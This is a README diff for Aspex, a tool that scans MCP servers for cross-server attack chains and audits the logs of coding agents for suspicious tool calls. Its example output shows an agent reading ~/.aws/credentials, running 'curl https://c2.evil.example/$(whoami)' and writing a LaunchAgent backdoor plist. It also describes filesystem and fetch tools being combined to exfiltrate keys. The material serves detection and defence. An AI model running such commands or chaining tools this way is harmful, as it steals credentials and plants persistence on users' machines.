@@ -147,11 +147,14 @@ aspex-scan <command>
 
 Commands:
   inspect <target>      Scan a single server by command or URL
+  inventory             List every MCP server and tool on this machine
+  attack-paths          Identify dangerous cross-server attack chains
   diff --baseline <f>   Compare to a saved baseline (rug-pull detection)
   verify <package>      Check an npm package against the known-bad registry
   install-hook          Install a git pre-commit hook
   uninstall-hook        Remove the pre-commit hook
-  version               Print version
+  completion <shell>    Generate shell completion script (bash|zsh|fish)
+  version [--check]     Print version; --check queries GitHub for updates
 
 Flags:
   --no-exec             Static only: parse configs, skip launching servers
@@ -165,6 +168,44 @@ Flags:
   --fail-on <sev>       Exit 1 at or above this severity:
                         critical, high, medium, low (default: off)
   --no-color            Disable colour output
+```
+
+### Attack path analysis
+
+The `attack-paths` command does something no per-server scanner can: it identifies dangerous **cross-server** capability combinations that together form a complete attack chain.
+
+```sh
+# Does your setup allow file exfiltration?
+aspex-scan attack-paths
+
+# JSON output for pipeline processing
+aspex-scan attack-paths --json | jq '.chains[] | select(.severity=="critical")'
+```
+
+Example output:
+```
+  ◆  Attack Path Analysis
+
+  CRITICAL  Data Exfiltration  · Exfiltration (TA0010)
+     filesystem + fetch combined: attacker can read ~/.*rc, SSH keys, .env
+     and POST their contents to an attacker-controlled URL
+     servers: filesystem → fetch
+     │ filesystem provides: read_file, list_directory
+     │ fetch provides: http_request
+     │ Combined: attacker reads ~/.aws/credentials and posts to attacker URL
+
+  HIGH  Persistence via Shell  · Persistence (TA0003)
+     ...
+```
+
+### MCP inventory
+
+```sh
+# See exactly what MCP surface area you have
+aspex-scan inventory
+
+# JSON for jq / scripting
+aspex-scan inventory --json | jq '.servers[] | select(.tool_count > 20)'
 ```
 
 ### Rug-pull detection
@@ -202,28 +243,62 @@ Reads the native log files that Claude Desktop, Claude Code CLI, Cursor, and Win
 ```
   ◆  Aspex  v0.1.0
 
-  Clients: Claude Desktop, Claude Code, Cursor
-  Sessions: 6 (last 24h)   Tool calls: 243 across 11 servers
+  Clients scanned: claude-code, cursor
+  Sessions found:  3  (last 24h)
+  Tool calls:      243 across 11 server(s)
+
+  Activity
+  12 file write(s)  ·  37 file read(s)  ·  89 shell cmd(s)  ·  4 network call(s)  ·  3 commit(s)
+  Top tools:   Bash (89)  ·  Read (37)  ·  Edit (12)  ·  Write (8)  ·  fetch (4)
+  Top servers: claude-code (201)  ·  filesystem-mcp (42)
+  File access heatmap:
+    ████████████  12x  ~/src/app/main.py
+    ████████       8x  ~/src/app/config.py
+    ██             3x  ~/.aws/credentials
 
   CRITICAL
   ● [02:17:44]  cursor / filesystem-mcp    run_command
-    "curl https://c2.evil.example/$(whoami)"
-    AT003   Shell command executed                    OWASP LLM06 · CWE-78
-    AT002   Outbound network call to external host    OWASP LLM08 · CWE-918
+    AT003   Shell command executed
+             Tool 'run_command' called with: curl https://c2.evil.example/$(whoami)
+    AT002   Outbound network call to external host
+             Tool 'run_command' made an outbound request to: https://c2.evil.example/
 
   CRITICAL
   ● [02:17:46]  cursor / filesystem-mcp    write_file
-    /Users/alice/Library/LaunchAgents/backdoor.plist
-    AT014   Persistence mechanism write (LaunchAgent) OWASP LLM06 · ATLAS AML.T0048
+    AT014   Persistence mechanism write
+             Write to persistence location: ~/Library/LaunchAgents/backdoor.plist
 
   HIGH
-  ● [02:17:41]  cursor / filesystem-mcp    read_file   /Users/alice/.aws/credentials
-    AT001   Sensitive path accessed                    OWASP LLM02 · CWE-22
+  ● [02:17:41]  cursor / filesystem-mcp    read_file
+    AT001   Sensitive path accessed
+             Tool arg references sensitive path: ~/.aws/credentials
 
-  OK: 237 tool calls showed no anomalies.
+  OK: 237 tool call(s) showed no anomalies.
 ```
 
 *That session happened at 2:17 AM. The agent read AWS credentials, made an outbound curl to an external host, then wrote a LaunchAgent plist. Textbook post-exploitation sequence. aspex-trace caught it from logs already on disk.*
+
+#### Compact summary mode
+
+Use `--summary` for a quick daily check — stats and finding count only, no per-event breakdown:
+
+```
+  ◆  Aspex  v0.1.0
+
+  Session summary  (last 24h, claude-code)
+  1061 tool calls  ·  5 server(s)  ·  1 session(s)
+
+  Activity
+  89 file write(s)  ·  47 file read(s)  ·  23 shell cmd(s)  ·  8 commit(s)
+  Top tools:   Edit (312)  ·  Bash (189)  ·  Read (147)  ·  Write (89)
+  Top servers: claude-code (1008)  ·  Claude_Preview (47)  ·  github (6)
+  File access heatmap:
+    ████████████  41x  ~/src/app/main.py
+    █████████     28x  ~/src/app/api.py
+    ████           9x  ~/src/app/config.py
+
+  ✓  No anomalies found.
+```
 
 ### What it catches (85+ rules)
 
@@ -273,12 +348,18 @@ Both tools install together — `brew install aspex-security/tap/aspex` installs
 # Audit the last 24 hours of agent activity across all supported clients
 aspex-trace
 
+# Compact daily summary — stats + finding count only
+aspex-trace --summary
+
 # Audit the last 7 days
 aspex-trace --since 7d
 
 # Filter to one client or one server
 aspex-trace --client cursor
 aspex-trace --client claude --server filesystem-mcp
+
+# Suppress low-signal noise for coding-agent sessions
+aspex-trace --suppress-noise
 
 # Exit 1 if any critical findings (useful in CI or post-agent hooks)
 aspex-trace --fail-on critical
@@ -291,19 +372,157 @@ aspex-trace [flags]
 aspex-trace <command>
 
 Commands:
+  stats                Activity dashboard — no rule evaluation, just counts
+  session [id]         Forensic timeline for one session (list or drill in)
+  export               Export all events to CSV or JSONL
+  live                 Real-time monitoring — tails logs and prints new findings
   baseline --learn     Build a behavioural baseline from recent logs
-  version              Print version
+  completion <shell>   Generate shell completion script (bash|zsh|fish)
+  version [--check]    Print version; --check queries GitHub for updates
 
 Flags:
   --client <name>      Filter to one client:
-                       claude, claude-code, cursor, windsurf (default: all)
+                       claude|claude-code|cursor|windsurf|cline|roo-cline
+                       (default: all)
   --server <name>      Filter to one MCP server name
   --since <duration>   How far back to look: 1h, 24h, 7d (default: 24h)
+  --summary            Compact stats + finding count only, no per-event detail
   --baseline <file>    Compare against a saved behavioural baseline
+  --suppress-noise     Suppress low-signal rules for coding agents (after-hours,
+                       high-volume args from file content, etc.)
   --json               Machine-readable JSON output
   --sarif              SARIF output for code scanning
   --fail-on <sev>      Exit 1 at or above this severity (default: high)
   --no-color           Disable colour output
+```
+
+### Session forensics
+
+After the main report flags a session, drill into the exact sequence of events:
+
+```sh
+# List recent sessions
+aspex-trace session
+
+# Forensic timeline for a specific session
+aspex-trace session filesystem --since 7d
+
+# JSON for pipeline analysis
+aspex-trace session claude-code/2024-01-15/filesystem --json
+```
+
+### Export for SIEM / custom analysis
+
+```sh
+# Export last 7 days to CSV
+aspex-trace export --since 7d --format csv --output audit.csv
+
+# JSONL to stdout, pipe to jq
+aspex-trace export --format jsonl | jq 'select(.max_severity=="critical")'
+```
+
+### Activity dashboard
+
+```sh
+# Quick stats — no rule evaluation, much faster on large log sets
+aspex-trace stats
+
+# Last 7 days, Cursor only
+aspex-trace stats --since 7d --client cursor
+```
+
+### Real-time monitoring
+
+```sh
+# Watch all clients, alert on new findings every 5 seconds
+aspex-trace live
+
+# Watch only Claude Code, faster poll
+aspex-trace live --client claude-code --interval 2
+```
+
+---
+
+## Examples
+
+Real-world workflows combining both tools.
+
+### Before installing a new MCP server
+
+```sh
+# 1. Static scan first — no code runs
+aspex-scan inspect "npx -y @some-org/mcp-server-xyz" --no-exec
+
+# 2. If it looks clean, do a live scan
+aspex-scan inspect "npx -y @some-org/mcp-server-xyz"
+
+# 3. Check attack paths after installing it
+aspex-scan attack-paths
+```
+
+### Daily security audit (automate in cron)
+
+```sh
+# Morning check: anything suspicious overnight?
+aspex-trace --since 12h --fail-on high
+
+# Weekly scan: have any servers changed?
+aspex-scan diff --baseline ~/.config/aspex/baseline.json
+```
+
+### After an unexpected agent session
+
+```sh
+# See what happened in the last hour
+aspex-trace --since 1h
+
+# Drill into a specific suspicious session
+aspex-trace session --since 1h  # lists sessions
+aspex-trace session filesystem --since 1h  # full timeline
+```
+
+### CI gate for agent-enabled repos
+
+```yaml
+# .github/workflows/ci.yml — add to any repo using MCP
+- name: Audit agent activity
+  uses: aspex-security/aspex/.github/actions/aspex-trace-action@v0.2
+  with:
+    fail-on: critical
+
+- name: Scan MCP configs
+  uses: aspex-security/aspex/.github/actions/aspex-scan-action@v0.2
+  with:
+    fail-on: high
+```
+
+### Investigate a compromised machine
+
+```sh
+# Full 30-day history — everything that happened
+aspex-trace --since 30d --json > audit-30d.json
+
+# Export all events for external forensics tools
+aspex-trace export --since 30d --format jsonl | \
+  jq 'select(.rule_ids | length > 0)' > flagged-events.jsonl
+
+# What MCP servers did this machine have?
+aspex-scan inventory --json > inventory.json
+
+# Could any of them exfiltrate data?
+aspex-scan attack-paths --json
+```
+
+### Shell completions
+
+```sh
+# Set up completions once (example: zsh)
+aspex-scan completion zsh > "${fpath[1]}/_aspex-scan"
+aspex-trace completion zsh > "${fpath[1]}/_aspex-trace"
+
+# Or for the current session
+source <(aspex-scan completion bash)
+source <(aspex-trace completion bash)
 ```
 
 ---
